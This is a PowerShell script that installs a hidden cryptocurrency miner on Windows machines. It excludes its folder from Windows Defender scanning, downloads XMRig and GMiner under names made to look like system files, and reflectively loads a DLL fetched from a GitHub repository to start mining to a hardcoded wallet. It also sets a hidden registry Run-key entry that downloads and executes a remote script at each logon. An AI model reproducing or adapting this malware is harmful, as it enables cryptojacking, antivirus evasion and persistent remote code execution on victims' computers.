$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr.$env:COMPUTERNAME"

$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
try { Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue } catch { }
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuZip = Join-Path $StealthDir "update_c.zip"
$GpuZip = Join-Path $StealthDir "update_g.zip"
$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    if (-not (Test-Path $CpuExe)) {
        $wc.DownloadFile($MinerUrl, $CpuZip)
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $CpuExe -Force
    }

    $GpuDetected = $null
    try {
        $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if ($vc) {
            # Added VEN_1002 for AMD and match for Radeon/AMD strings
            $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
        }
    } catch { }

    if ($GpuDetected -and -not (Test-Path $GpuExe)) {
        $wc.DownloadFile($GpuMinerUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
    }

    Write-Host "[*] Triggering Bridge.dll Reflective Load..."
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetType("DateFundLoader")
    $startMethod = $loader.GetMethod("StartMiner")
    
    $GpuArg = if ($GpuDetected) { [string]$GpuExe } else { "" }
    Write-Host "[*] Invoking Miner Process..."
    # Force everything into raw strings to kill the PSObject conversion bug for good
    $p = [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet)
    $startMethod.Invoke($null, $p)
    
    Write-Host "[*] Hooking Registry..."
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "WinSysUpdater"
    $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
    Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
    
    Write-Host "working"

} catch {
    Write-Host "CRASHED: $($_.Exception.Message)"
}
